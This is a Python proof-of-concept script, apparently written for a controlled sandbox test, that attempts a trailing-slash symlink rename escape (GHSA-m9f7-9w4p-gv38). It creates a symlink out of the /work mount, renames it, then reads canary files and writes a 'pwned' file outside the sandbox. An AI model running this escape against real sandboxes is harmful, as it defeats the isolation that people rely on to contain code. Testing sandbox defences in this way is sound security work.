# Runs INSIDE the sandbox. Writable grant mounted at /work (points at scratch grant/).
# Attempts the GHSA-m9f7-9w4p-gv38 trailing-slash symlink rename escape.
import os, json

r = {"steps": []}
def log(k, v): r["steps"].append((k, v))

os.chdir("/work")
# 1) create a relative symlink pointing out of the sandbox
try:
    if os.path.lexists("up"):
        os.remove("up")
    os.symlink("../outside", "up")
    log("symlink ../outside -> up", "ok")
except OSError as e:
    log("symlink", f"errno {e.errno} {e.strerror}")

# 2) try the rename with a trailing slash on the source: up/ -> stolen
for src, dst in [("up/", "stolen"), ("up", "stolen2/")]:
    try:
        os.rename(src, dst)
        log(f"rename {src!r}->{dst!r}", "ok")
    except OSError as e:
        log(f"rename {src!r}->{dst!r}", f"errno {e.errno} {e.strerror}")

# 3) see what is now reachable inside the sandbox
for name in ("stolen", "stolen2", "up"):
    p = "/work/" + name
    try:
        log(f"listdir {name}", sorted(os.listdir(p)))
    except OSError as e:
        log(f"listdir {name}", f"errno {e.errno} {e.strerror}")

# 4) try to read the canary through any path that worked
for cand in ("/work/stolen/secret_dir/canary.txt", "/work/stolen/loose_canary.txt",
             "/work/stolen2/secret_dir/canary.txt", "/work/up/loose_canary.txt"):
    try:
        with open(cand) as f:
            log(f"READ {cand}", f.read().strip())
    except OSError as e:
        log(f"read {cand}", f"errno {e.errno} {e.strerror}")

# 5) try to WRITE outside
for cand in ("/work/stolen/pwned.txt", "/work/up/pwned.txt"):
    try:
        with open(cand, "w") as f:
            f.write("written-by-guest")
        log(f"WROTE {cand}", "ok")
    except OSError as e:
        log(f"write {cand}", f"errno {e.errno} {e.strerror}")

print("RESULT " + json.dumps(r))
